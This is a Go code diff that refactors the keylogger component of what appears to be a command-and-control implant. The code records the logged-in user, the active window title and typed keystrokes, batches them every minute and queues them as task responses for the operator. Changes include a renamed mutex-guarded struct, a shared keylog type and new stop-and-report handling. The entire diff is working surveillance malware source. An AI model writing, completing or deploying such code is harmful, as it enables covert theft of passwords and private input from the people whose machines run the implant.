@@ -70,62 +70,57 @@ var (
 	}
 )
 
-type KeyLog struct {
+type KeyLogWithMutex struct {
 	User        string `json:"user"`
 	WindowTitle string `json:"window_title"`
 	Keystrokes  string `json:"keystrokes"`
 	mtx         sync.Mutex
 }
 
-type serializableKeyLog struct {
-	User        string `json:"user"`
-	WindowTitle string `json:"window_title"`
-	Keystrokes  string `json:"keystrokes"`
-}
-
-func (k *KeyLog) AddKeyStrokes(s string) {
+func (k *KeyLogWithMutex) AddKeyStrokes(s string) {
 	k.mtx.Lock()
 	k.Keystrokes += s
 	k.mtx.Unlock()
 }
 
-func (k *KeyLog) ToSerialStruct() serializableKeyLog {
-	return serializableKeyLog{
+func (k *KeyLogWithMutex) ToSerialStruct() structs.Keylog {
+	return structs.Keylog{
 		User:        k.User,
 		WindowTitle: k.WindowTitle,
 		Keystrokes:  k.Keystrokes,
 	}
 }
 
-func (k *KeyLog) SetWindowTitle(s string) {
+func (k *KeyLogWithMutex) SetWindowTitle(s string) {
 	k.mtx.Lock()
 	k.WindowTitle = s
 	k.mtx.Unlock()
 }
 
-func (k *KeyLog) SendMessage() {
+func (k *KeyLogWithMutex) SendMessage() {
 	serMsg := ksmonitor.ToSerialStruct()
 	msg := structs.Response{}
 	msg.TaskID = curTask.TaskID
+	keylogs := make([]structs.Keylog, 0, 1)
+	msg.Keylogs = &keylogs
 	data, err := json.MarshalIndent(serMsg, "", "    ")
 	//log.Println("Sending across the wire:", string(data))
 	if err != nil {
 		msg.UserOutput = err.Error()
 		msg.Status = "error"
 		msg.Completed = true
-		resp, _ := json.Marshal(msg)
-		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		curTask.Job.SendResponses <- msg
 	} else {
 		profiles.TaskResponses = append(profiles.TaskResponses, data)
 	}
 }
 
-func NewKeyLog() (KeyLog, error) {
+func NewKeyLog() (KeyLogWithMutex, error) {
 	curUser, err := user.Current()
 	if err != nil {
-		return KeyLog{}, err
+		return KeyLogWithMutex{}, err
 	}
-	return KeyLog{
+	return KeyLogWithMutex{
 		User:        curUser.Username,
 		WindowTitle: "",
 		Keystrokes:  "",
@@ -134,10 +129,10 @@ func NewKeyLog() (KeyLog, error) {
 
 func StartKeylogger(task structs.Task) error {
 	// This function is responsible for dumping output.
-	if curTask != nil && curTask.Job.Monitoring {
+	if curTask != nil {
 		return errors.New(fmt.Sprintf("Keylogger already running with task ID: %s", curTask.TaskID))
 	}
-
+	curTask = &task
 	go func() {
 		for {
 			timer := time.NewTimer(time.Minute)
@@ -148,7 +143,12 @@ func StartKeylogger(task structs.Task) error {
 				ksmonitor.Keystrokes = ""
 				ksmonitor.mtx.Unlock()
 			}
-			if *task.Job.Stop > 0 {
+			if task.ShouldStop() {
+				msg := structs.Response{}
+				msg.TaskID = curTask.TaskID
+				msg.UserOutput = "Keylogging stopped"
+				task.Job.SendResponses <- msg
+				curTask = nil
 				break
 			}
 		}
